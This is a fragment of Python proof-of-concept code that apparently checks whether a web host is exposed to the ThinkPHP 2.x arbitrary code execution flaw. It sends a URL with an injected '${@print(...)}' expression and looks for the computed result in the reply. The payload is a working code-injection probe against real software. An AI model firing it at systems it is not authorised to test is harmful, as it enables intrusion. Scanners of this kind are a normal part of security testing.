...
def jquery_upload_file(url):
    global vul_info
    pocdict = {
        "vulnname":"ThinkPHP 2.x 任意代码执行漏洞",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        ...
        "vul_level":"2",#高危
        "vul_type":"4",#代码执行
        "vul_exp_script":"ThinkPHP 2.x_exp.py"
    }
    headers = {
    ...
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=/index/index/name/${@print(12*12*12*12*12*12*12*100)}')
        print(vurl)
        req = requests.get(vurl,headers=headers, timeout=15, verify=False)
        if '3583180800' in req.text:
            pocdict['isvul'] = True
